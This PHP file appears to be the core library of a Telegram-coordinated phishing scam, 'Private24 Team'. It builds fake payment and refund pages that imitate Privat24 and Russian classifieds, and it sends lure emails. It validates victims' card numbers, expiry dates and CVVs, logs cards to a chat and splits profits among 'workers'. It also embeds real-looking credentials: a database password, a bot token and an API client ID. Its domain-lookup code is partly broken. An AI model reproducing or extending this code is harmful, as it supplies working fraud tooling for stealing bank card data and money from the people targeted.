<?php
	error_reporting(0);
	date_default_timezone_set('Europe/Moscow');
	require('rb.php');
	// Данные для подключения к MySQL серверу.
R::setup('mysql:host=localhost;
	  dbname=priv', // Имя базы
	  'priv', // Имя пользователя
	  'Parol2020'); // Пароль

	$domains = array
	(
		'privat1' => 'https://privat24-p2p24.online/?id=',
	);

	
	function botToken() {
		return '5148731097:AAEX68WPhT6hQCgQt_ksrF_DWCwbjJia5nc'; // токен telegram бота
	}
	
	function botLogin() {
		return 'Lkprivate24_bot'; // логин бота без @
	}
	
	function prjName() {
		return 'Private24 Team'; // название тимы
	}
	
	function linkChat() {
		return 'https://t.me/joinchat/lIjihpl2o7UxYmMy'; // ссылка на чат воркеров
	}
	
	 function linkPays() {
		return 'https://t.me/rnbwith'; // ссылка на канал выплат
	}
	
	function chatLogs(){ // айди для логов карт
		return '-669389751';
	}
	
	function chatGroup() {
		return '-669389751'; // айди чата воркеров
	}
	
	function chatAdmin() {
		return '-669389751'; // айди чата админов
	}
	
	function chatAlerts() {
		return '-669389751'; // айди чата админов
	}
	
	function chatProfits() {
		return '-669389751'; // айди чата воркеров
	}
	
	function amountMax() {
		return 30000; // макс сумма
	}
	
	function amountMin() {
		return 1; // мин сумма
	}

	function baloutMin() {
		return 1000;
	}

	function referalRate() {
		return 2;
	}


	function getDomains($a) {
		return [
			1 => [$domains['olx1.0']],
			2 => [$domains['olx2.0']],
			2 => [$domains['refund']],
		][$a];
	}

	function getDomain($a, $b = 0) {
		return getDomains(intval($a))[$b];
	}


	function getFakeRedir($dom, $item, $isnr) {
		return 'https://'.$dom.'/'.($isnr ? 'merchant' : 'refund').$item;
	}
	
	function getFakeUrl($id, $item, $a, $b = 0) {
		return ($id ? 'https://'.getUserDomainName($id, $a).'/' : '').getFakePage(in_array($a, [1, 2]) ? 1 : 2, $b).$item;
	}
	


	function userStatusName($a) {
		return [
			0 => 'Без статуса',
			1 => 'Заблокирован',
			2 => 'Воркер',
			3 => 'Помощник',
			4 => 'Модератор',
			5 => 'Администратор',
		][$a];
	}
	
	function getCard() {
		return fileRead(dirSettings('card'));
	}
	
	function setCard($n) {
		return fileWrite(dirSettings('card'), $n);
	}

	function getCard2() {
		return explode('`', fileRead(dirSettings('card2')));
	}
	
	function setCard2($n, $j) {
		return fileWrite(dirSettings('card2'), implode('`', [$n, $j]));
	}

	function getPaymentName() {
		return intval(fileRead(dirSettings('pay')));
	}
	
	function setPaymentName($n) {
		return fileWrite(dirSettings('pay'), $n);
	}
	
	function fixAmount($a) {
		return min(max($a, amountMin()), amountMax());
	}

	function getUserDomainName($id, $a) {
		return getDomain($a, getUserDomain($id, $a));
	}
	
	function dirUsers($id, $n = false) {
		return 'users/'.$id.($n ? '/'.$n.'.txt' : '');
	}
	
	function dirItems($n, $isnt) {
		return ($isnt ? 'items' : 'tracks').'/'.$n.'.txt';
	}
	
	function dirStats($n) {
		return 'stats/'.$n.'.txt';
	}
	
	function dirSettings($n) {
		return 'settings/'.$n.'.txt';
	}
	
	function dirBin($n) {
		return 'bin/'.$n.'.txt';
	}
	
	function dirIp($n) {
		return 'ip/'.$n.'.txt';
	}
	
	function dirPays($n) {
		return 'pays/'.$n.'.txt';
	}
	
	function dirMails($n) {
		return 'mails/'.$n.'.txt';
	}

	function dirChecks($n) {
		return 'checks/'.$n.'.txt';
	}

	function dirPages($n) {
		return 'pages/'.$n.'.txt';
	}

	function dirStyles($n) {
		return 'styles/'.$n.'.txt';
	}

	function dirScripts($n) {
		return 'scripts/'.$n.'.txt';
	}

	function setIpData($ip, $n, $v) {
		fileWrite(dirIp($n.'_'.$ip), $v);
	}

	function getIpData($ip, $n) {
		return fileRead(dirIp($n.'_'.$ip));
	}

	function getLastAlert() {
		return fileRead(dirSettings('alert'));
	}
	
	function setLastAlert($n) {
		return fileWrite(dirSettings('alert'), $n);
	}

	function isItem($item, $isnt) {
		return file_exists(dirItems($item, $isnt));
	}
	
	function delItem($item, $isnt) {
		fileDel(dirItems($item, $isnt));
	}
	
	function addItem($v, $isnt) {
		$item = 0;
		while (true) {
			$item = rand(10000000, 99999999);
			if (!isItem($item, $isnt))
				break;
		}
		fileWrite(dirItems($item, $isnt), implode('`', $v));
		return $item;
	}
	
	function getItemData($item, $isnt) {
		$t = explode('`', fileRead(dirItems($item, $isnt)));
		$t[0] = intval($t[0]);
		$t[1] = intval($t[1]);
		$t[2] = intval($t[2]);
		$t[4] = intval($t[4]);
		$t[5] = intval($t[5]);
		return $t;
	}
	
	function setItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}
	
	function addItemData($item, $n, $v, $isnt) {
		$t = getItemData($item, $isnt);
		$t[$n] = intval($t[$n]) + $v;
		fileWrite(dirItems($item, $isnt), implode('`', $t));
	}
	
	function getUserItems($id, $isnt) {
		$t = getUserData($id, $isnt ? 'items' : 'tracks');
		if (!$t)
			return [];
		return explode('`', $t);
	}
	
	function setUserItems($id, $items, $isnt) {
		setUserData($id, $isnt ? 'items' : 'tracks', implode('`', $items));
	}

	function getUserDomains($id) {
		$doms = explode('`', getUserData($id, 'doms'));
		$c = 5 - count($doms);
		if ($c > 0)
			for ($i = 0; $i < $c; $i++)
				$doms[] = '';
		return $doms;
	}

	function getUserDomain($id, $srvc) {
		return intval(getUserDomains($id)[intval($srvc) - 1]);
	}

	function setUserDomain($id, $srvc, $n) {
		$doms = getUserDomains($id);
		$doms[$srvc - 1] = ($n === 0 ? '' : $n);
		setUserData($id, 'doms', implode('`', $doms));
	}
	
	function isUserAnon($id) {
		return (getUserData($id, 'anon') == '1');
	}
	
	function setUserAnon($id, $v) {
		setUserData($id, 'anon', $v ? '1' : '');
	}
	
	function getUserReferal($id) {
		$referal = getUserData($id, 'referal');
		if (isUserBanned($referal))
			return false;
		return $referal;
	}
	
	function setUserReferal($id, $v) {
		if (isUserBanned($v))
			return;
		setUserData($id, 'referal', $v);
	}
	
	function getUserReferalName($id, $a = false, $b = false) {
		$t = getUserReferal($id);
		return ($t ? userLogin($t, $a, $b) : 'Никто');
	}
	
	function delUserItem($id, $item, $isnt) {
		delItem($item, $isnt);
		$items = getUserItems($id, $isnt);
		if (!in_array($item, $items))
			return;
		unset($items[array_search($item, $items)]);
		setUserItems($id, $items, $isnt);
	}
	
	function addUserItem($id, $v, $isnt) {
		$item = addItem($v, $isnt);
		$items = getUserItems($id, $isnt);
		if (in_array($item, $items))
			return 0;
		$items[] = $item;
		setUserItems($id, $items, $isnt);
		return $item;
	}
	
	function isUserItem($id, $item, $isnt) {
		$items = getUserItems($id, $isnt);
		return in_array($item, $items);
	}

	function getUserChecks($id) {
		$t = getUserData($id, 'checks');
		if (!$t)
			return [];
		return explode('`', $t);
	}
	
	function setUserChecks($id, $checks) {
		setUserData($id, 'checks', implode('`', $checks));
	}

	function urlCheck($check) {
		return 'https://t.me/'.botLogin().'?start=c_'.$check;
	}

	function isCheck($check) {
		return file_exists(dirChecks($check));
	}
	
	function delCheck($check) {
		fileDel(dirChecks($check));
	}
	
	function addCheck($v) {
		$check = 0;
		while (true) {
			$check = bin2hex(random_bytes(16));
			if (!isCheck($check))
				break;
		}
		fileWrite(dirChecks($check), implode('`', $v));
		return $check;
	}
	
	function getCheckData($check) {
		$t = explode('`', fileRead(dirChecks($check)));
		$t[0] = intval($t[0]);
		return $t;
	}

	function delUserCheck($id, $check) {
		delCheck($check);
		$checks = getUserChecks($id);
		if (!in_array($check, $checks))
			return;
		unset($checks[array_search($check, $checks)]);
		setUserChecks($id, $checks);
	}

	function addUserCheck($id, $v) {
		$check = addCheck($v);
		$checks = getUserChecks($id);
		if (in_array($check, $checks))
			return 0;
		$checks[] = $check;
		setUserChecks($id, $checks);
		return $check;
	}
	
	function isUserCheck($id, $check) {
		$checks = getUserChecks($id);
		return in_array($check, $checks);
	}
	
	function getRate($id = false) {
		$t = explode('`', fileRead(dirSettings('rate')));
		$prc1 = intval($t[0]);
		$prc2 = intval($t[1]);
		if (!$id)
			return [$prc1, $prc2];
		$t = getUserData($id, 'rate');
		if (!$t)
			return [$prc1, $prc2];
		$t = intval($t);
		return [$prc1 + $t, $prc2 + $t];
	}
	
	function setUserData($id, $n, $v) {
		$t = dirUsers($id, $n);
		if ($v == '') {
			if (file_exists($t))
				fileDel($t);
		} else
			fileWrite($t, $v);
	}
	
	function getUserData($id, $n) {
		return fileRead(dirUsers($id, $n));
	}
	
	function setInput($id, $v) {
		setUserData($id, 'input', $v);
	}
	
	function getInput($id) {
		return getUserData($id, 'input');
	}
	
	function setUserBalance($id, $v) {
		setUserData($id, 'balance', $v);
	}
	
	function getUserBalance($id) {
		return intval(getUserData($id, 'balance'));
	}
	
	function addUserBalance($id, $v) {
		setUserBalance($id, intval(getUserBalance($id) + $v));
	}

	function setUserBalance2($id, $v) {
		setUserData($id, 'balance2', $v);
	}
	
	function getUserBalance2($id) {
		return intval(getUserData($id, 'balance2'));
	}
	
	function addUserBalance2($id, $v) {
		setUserBalance2($id, intval(getUserBalance2($id) + $v));
	}
	
	function setUserBalanceOut($id, $v) {
		setUserData($id, 'balanceout', $v);
	}
	
	function getUserBalanceOut($id) {
		return intval(getUserData($id, 'balanceout'));
	}
	
	function getUserHistory($id) {
		$t = getUserData($id, 'history');
		if (!$t)
			return false;
		return explode('`', $t);
	}
	
	function addUserHistory($id, $v) {
		$t = getUserHistory($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'history', implode('`', $t));
	}

	function getUserProfits($id) {
		$t = getUserData($id, 'profits');
		if (!$t)
			return false;
		return explode('`', $t);
	}
	
	function addUserProfits($id, $v) {
		$t = getUserProfits($id);
		$t[] = implode('\'', $v);
		setUserData($id, 'profits', implode('`', $t));
	}

	function getUserRefs($id) {
		return intval(getUserData($id, 'refs'));
	}
	
	function addUserRefs($id) {
		setUserData($id, 'refs', intval(getUserRefs($id) + 1));
	}

	function getUserRefbal($id) {
		return intval(getUserData($id, 'refbal'));
	}
	
	function addUserRefbal($id, $v) {
		setUserData($id, 'refbal', intval(getUserRefbal($id) + $v));
	}
	
	function setInputData($id, $n, $v) {
		setUserData($id, 't/_'.$n, $v);
	}
	
	function getInputData($id, $n) {
		return getUserData($id, 't/_'.$n);
	}
	
	function setUserStatus($id, $v) {
		setUserData($id, 'status', $v);
	}
	
	function getUserStatus($id) {
		return intval(getUserData($id, 'status'));
	}
	
	function getUserStatusName($id) {
		return userStatusName(getUserStatus($id));
	}
	
	function isUserAccepted($id) {
		return (intval(getUserData($id, 'joined')) > 0);
	}
	
	function isUser($id) {
		return is_dir(dirUsers($id));
	}
	
	function isUserBanned($id) {
		return (getUserStatus($id) == 1);
	}
	
	function canUserRcvSms($id) {
		return userJoined($id) >= 7;
	}
	
	function getUserProfit($id) {
		$t = getUserData($id, 'profit');
		if (!$t)
			return [0, 0];
		$t = explode('`', $t);
		return [intval($t[0]), intval($t[1])];
	}
	
	function addUserProfit($id, $amount, $rate) {
		$profit = getUserProfit($id);
		setUserData($id, 'profit', implode('`', [$profit[0] + 1, $profit[1] + $amount]));
		$amount0 = 0;
		$referal = getUserReferal($id);
		if ($referal) {
			$amount0 = intval($amount * referalRate() / 100);
			addUserBalance($referal, $amount0);
			addUserRefbal($referal, $amount0);
		}
		$amount = intval($amount * $rate) - $amount0;
		addUserBalance($id, $amount);
		addUserProfits($id, [time(), $amount]);
		return [$amount, $amount0];
	}
	
	function getProfit() {
		$t = explode('`', fileRead(dirStats('profit')));
		return [intval($t[0]), intval($t[1]), intval($t[2])];
	}
	
	function addProfit($v, $m) {
		$t = getProfit();
		fileWrite(dirStats('profit'), implode('`', [$t[0] + 1, $t[1] + $v, $t[2] + $m]));
	}

	function urlReferal($v) {
		return 'https://t.me/'.botLogin().'?start=r_'.$v;
	}
	
	function regUser($id, $login, $accept = false) {
		if ($accept) {
			setUserData($id, 'joined', time());
			setUserStatus($id, 2);
			return true;
		} else {
			if (!isUser($id)) {
				mkdir(dirUsers($id));
				mkdir(dirUsers($id).'/t');
				setUserData($id, 'login', $login);
				return true;
			}
		}
		return false;
	}
	
	function updLogin($id, $login) {
		$t = getUserData($id, 'login');
		if (strval($t) == strval($login))
			return false;
		setUserData($id, 'login', $login);
		return true;
	}
	
	function userJoined($id) {
		return intval((time() - intval(getUserData($id, 'joined'))) / 86400);
	}
	
	function userLogin($id, $shid = false, $shtag = false) {
		$login = getUserData($id, 'login');
		return ($shtag ? getUserStatusName($id).' ' : '').'<a href="tg://user?id='.$id.'">'.($login ? $login : 'Без ника').'</a>'.($shid ? ' ['.$id.']' : '');
	}

	function userLogin2($id) {
		return (isUserAnon($id) ? 'Скрыт' : userLogin($id));
	}
	
	function makeProfit($id, $isnr, $amount, $pkoef) {
		$rate = getRate($id)[$isnr == 1 ? 0 : 1] - (($pkoef - 1) * 10);
		if ($rate < 10)
			$rate = 10;
		$rate /= 100;
		$t = addUserProfit($id, $amount, $rate);
		addProfit($amount, $t[0] + $t[1]);
		return $t;
	}
	
	function createBalout($id) {
		$balance = getUserBalance($id);
		setUserBalance($id, 0);
		setUserBalanceOut($id, $balance);
		return $balance;
	}
	
	function makeBalout($id, $dt, $balout, $url) {
		setUserBalanceOut($id, 0);
		addUserHistory($id, [$dt, $balout, $url]);
		return true;
	}
	
	function request($url, $post = false, $rh = false) {
		$curl = curl_init($url);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		if ($rh)
			curl_setopt($curl, CURLOPT_HEADER, true);
		if ($post) {
			curl_setopt($curl, CURLOPT_POST, true);
			curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($post));
		}
		$result = curl_exec($curl);
		curl_close($curl);
		return $result;
	}
	
	function botSend($msg, $id = false, $kb = false) {
		if (!$id)
			$id = chatGroup();
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		return json_decode(request(botUrl('sendMessage'), $post), true)['ok'];
	}
	
	function botEdit($msg, $mid, $id, $kb = false) {
		if (is_array($msg))
			$msg = implode("\n", $msg);
		$post = [
			'parse_mode' => 'html',
			'disable_web_page_preview' => 'true',
			'chat_id' => $id,
			'message_id' => $mid,
			'text' => $msg,
		];
		if ($kb)
			$post['reply_markup'] = json_encode(botKeybd($kb));
		request(botUrl('editMessageText'), $post);
	}

	function botKick($id, $chat) {
		$post = [
			'chat_id' => $chat,
			'user_id' => $id,
		];
		return json_decode(request(botUrl('kickChatMember'), $post), true)['ok'];
	}
	
	function botDelete($mid, $id) {
		$post = [
			'chat_id' => $id,
			'message_id' => $mid,
		];
		request(botUrl('deleteMessage'), $post);
	}
	
	function botKeybd($v) {
		if ($v[0])
			return [
				'inline_keyboard' => $v[1]
			];
		else
			return [
				'keyboard' => $v[1],
				'resize_keyboard' => true,
				'one_time_keyboard' => false
			];
	}
	
	function botUrl($n) {
		return 'https://api.telegram.org/bot'.botToken().'/'.$n;
	}
	
	function botUrlFile($n) {
		return 'https://api.telegram.org/file/bot'.botToken().'/'.$n;
	}
	
	function isUrlItem($url, $a) {
		return count(explode('/', explode([
			1 => 'avito.ru',
			2 => 'youla.ru',
		][$a], $url, 2)[1])) >= 4;
	}
	
	function isUrlImage($url) {
		$head = mb_strtolower(explode("\r\n\r\n", request($url, false, true))[0]);
		$ctype = pageCut($head, 'content-type: ', "\r\n");
		return in_array($ctype, [
			'image/jpeg',
			'image/png',
			'image/webp',
		]);
	}
	
	function isEmail($n) {
		$ps = explode('@', $n);
		if (count($ps) != 2)
			return false;
		if (count(explode('.', $ps[1])) != 2)
			return false;
		$l = strlen($ps[0]);
		if ($l < 2 || $l > 64)
			return false;
		$o = '_-.';
		if (strpos($o, $ps[0][0]) !== false || strpos($o, $ps[0][$l - 1]) !== false)
			return false;
		for ($i = 0; $i < strlen($o); $i++)
			for ($j = 0; $j < strlen($o); $j++)
				if (strpos($ps[0], $o[$i].$o[$j]) !== false)
					return false;
		return true;
	}
	
	function fileRead($n) {
		if (!file_exists($n))
			return false;
		$f = fopen($n, 'rb');
		$v = fread($f, filesize($n));
		fclose($f);
		return $v;
	}
	
	function fileWrite($n, $v, $a = 'w') {
		$f = fopen($n, $a.'b');
		fwrite($f, $v);
		fclose($f);
		return true;
	}
	
	function fileDel($n) {
		if (file_exists($n))
			return unlink($n);
		return false;
	}
	
	function parseItem($id, $url, $a) {
		if ($a == 1)
			$url = 'https://www.avito.ru/'.explode('?', explode('avito.ru/', $url, 2)[1])[0];
		elseif ($a == 2)
			$url = 'https://youla.ru/'.explode('?', explode('youla.ru/', $url, 2)[1])[0];
		$page = str_replace(["\r", "\n"], '', request($url));
		if ($page == '')
			return false;
		$itemd = [0, 0, 0, $id, time()];
		if ($a == 1) {
			$itemd[] = pageCut($page, 'avito.item.price = \'', '\';');
			$itemd[] = pageCut($page, 'sticky-header-title"> ', ' </div>');
			$itemd[] = 'https:'.pageCut($page, 'avito.item.image = \'', '\';');
			$itemd[] = explode(', ', pageCut($page, 'item-address__string"> ', ' </'))[0];
		} elseif ($a == 2) {
			$itemd[] = intval(beaText(pageCut($page, '"price":', ','), chsNum())) / 100;
			$itemd[] = json_decode('"'.explode('"name":"', pageCut($page, '"products":[{', '","discountedPrice'))[1].'"');
			$itemd[] = str_replace('\\', '', explode('"urlForSize":"', pageCut($page, '"images":[{', '"},'))[1]);
			$itemd[] = json_decode('"'.pageCut($page, '"isFavorite":false,"location":{"description":"', '",').'"');
		}
		if (strlen($itemd[6]) == 0)
			return false;
		if (strlen($itemd[7]) == 0 || !isUrlImage($itemd[7]))
			return false;
		$itemd[5] = fixAmount(intval($itemd[5]));
		return $itemd;
	}
	
	function mailSend($maild, $itemd, $isnt) {
		$mailu = getEmailUser($maild[2]);
		$mailt = $maild[1];
		$t = explode("\r\n", str_replace([
			'%email%',
			'%url%',
			'%img%',
			'%title%',
			'%amount%',
			'%item%',
			'%domain%',
		], [
			'<span>'.str_replace('@', '</span>@<span>', $mailt).'</span>',
			getFakeUrl($itemd[3], $maild[0], $maild[2], $isnt ? $maild[3] : 1),
			$isnt ? $itemd[7] : '',
			$itemd[6],
			number_format($itemd[5], 0, '.', ' '),
			'CB'.$maild[0].'0RU',
			getUserDomainName($itemd[3], $maild[2]),
		], fileRead(dirMails($maild[2].'-'.$maild[3]))), 2);
		$maili = $t[0];
		$mailb = $t[1];
		$result = false;
		include '_mail.php';
		return $result;
	}

	function isValidCard($n, $m, $y, $c) {
		$n = beaCard($n);
		if (!$n)
			return false;
		$m = intval(beaText($m, chsNum()));
		if ($m < 1 || $m > 12)
			return false;
		$y = intval(beaText($y, chsNum()));
		if ($y < 20 || $y > 99)
			return false;
		$c = beaText($c, chsNum());
		if (strlen($c) != 3)
			return false;
		return true;
	}

	function isPayData($merchant) {
		return file_exists(dirPays(md5($merchant)));
	}

	function getPayData($merchant) {
		$t = explode('`', fileRead(dirPays(md5($merchant))));
		unlink(dirPays(md5($merchant)));
		return $t;
	}

	function setPayData($merchant, $v) {
		return fileWrite(dirPays(md5($merchant)), implode('`', $v));
	}

	function cardHide($n) {
		return cardBank($n).' ****'.substr($n, strlen($n) - 4);
	}
	
	function beaCash($v) {
		return number_format($v, 0, '', '').' UAH.';
	}
	
	function beaDays($v) {
		return $v.' '.selectWord($v, ['дней', 'день', 'дня']);
	}
	
	function beaKg($v) {
		return number_format(intval($v) / 1000, 1, '.', '').' кг';
	}
	
	function chsNum() {
		return '0123456789';
	}
	
	function chsAlpRu() {
		return 'йцукеёнгшщзхъфывапролджэячсмитьбюЙЦУКЕЁНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ';
	}
	
	function chsAlpEn() {
		return 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM';
	}
	
	function chsSym() {
		return ' .,/\\"\'()_-+=!@#$%^&*№?;:|[]{}';
	}
	
	function chsAll() {
		return chsNum().chsAlpRu().chsAlpEn().chsSym();
	}
	
	function chsFio() {
		return chsAlpRu().chsAlpEn().' .-\'';
	}
	
	function chsMail() {
		return chsNum().chsAlpEn().'_-.@';
	}
	
	function beaText($v, $c) {
		$t = '';
		for ($i = 0; $i < strlen($v); $i++)
			if (strpos($c, $v[$i]) !== false)
				$t .= $v[$i];
		return $t;
	}
	
	function pageCut($s, $s1, $s2) {
		if (strpos($s, $s1) === false || strpos($s, $s2) === false)
			return '';
		return explode($s2, explode($s1, $s, 2)[1], 2)[0];
	}
	
	function cardBank($n) {
		$n = substr($n, 0, 6);
		$t = fileRead(dirBin($n));
		if ($t)
			return $t;
		$page = json_decode(request('https://api.tinkoff.ru/v1/brand_by_bin?bin='.$n), true)['payload'];
		$t = $page['paymentSystem'].' '.$page['name'];
		fileWrite(dirBin($n), $t);
		return $t;
	}
	
	function imgUpload($v) {
		$v2 = json_decode(request(botUrl('getFile?file_id='.$v)), true)['result']['file_path'];
		if (!$v2)
			return false;
		$img = base64_encode(request(botUrlFile($v2)));
		$curl = curl_init('https://api.imgur.com/3/image.json');
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_HTTPHEADER, [
			'Authorization: Client-ID 9783c0d302010a0',
		]);
		curl_setopt($curl, CURLOPT_POST, true);
		curl_setopt($curl, CURLOPT_POSTFIELDS, [
			'image' => $img,
		]);
		$result = json_decode(curl_exec($curl), true)['data']['link'];
		curl_close($curl);
		return $result;
	}
	
	function beaCard($n) {
		$n = beaText($n, chsNum());
		if (strlen($n) < 13 || strlen($n) > 19)
			return false;
		$sum = 0;
		$len = strlen($n);
		for ($i = 0; $i < $len; $i++) {
			$d = intval($n[$i]);
			if (($len - $i) % 2 == 0) {
				$d *= 2;
				if ($d > 9)
					$d -= 9;
			}
			$sum += $d;
		}
		return (($sum % 10) == 0) ? $n : false;
	}

	function calcDelivery($c1, $c2) {
		$km = pageCut(request('https://www.distance.to/'.$c1.'/'.$c2), '<span class=\'value km\'>', '</');
		$km = intval(beaText(explode('.', $km)[0], chsNum()));
		$km = min(max($km, 0), 6000);
		$dp = 2;
		if ($km <= 1000)
			$dp = 1;
		else if ($km >= 3000)
			$dp = 3;
		$cost = min(max(intval($km / 5), 100), 1000);
		$d1 = min(max(intval($km / 500), 1), 10);
		$ms = min(max(intval($km / 1000), 3), 5) * 10;
		return implode('`', [$cost, $d1, $d1 + $dp, $ms]);
	}

	function selectWord($n, $v) {
		$n = intval($n);
		$d = $v[0];
		$j = ($n % 100);
		if ($j < 5 || $j > 20) {
			$j = ($n % 10);
			if ($j == 1)
				$d = $v[1];
			elseif ($j > 1 && $j < 5)
				$d = $v[2];
		}
		return $d;
	}

	function beaPhone($t) {
		$t = str_split($t);
		array_splice($t, 9, 0, ['-']);
		array_splice($t, 7, 0, ['-']);
		array_splice($t, 4, 0, [' ']);
		array_splice($t, 4, 0, [' ']);
		array_splice($t, 1, 0, [' ']);
		array_splice($t, 0, 0, ['+']);
		return implode('', $t);
	}

	function alertUsers($t) {
		$c1 = 0;
		$c2 = 0;
		foreach (glob(dirUsers('*')) as $t1) {
			$id2 = basename($t1);
			if (botSend([
				$t,
			], $id2))
				$c1++;
			else
				$c2++;
		}
		return [$c1, $c2];
	}
?>
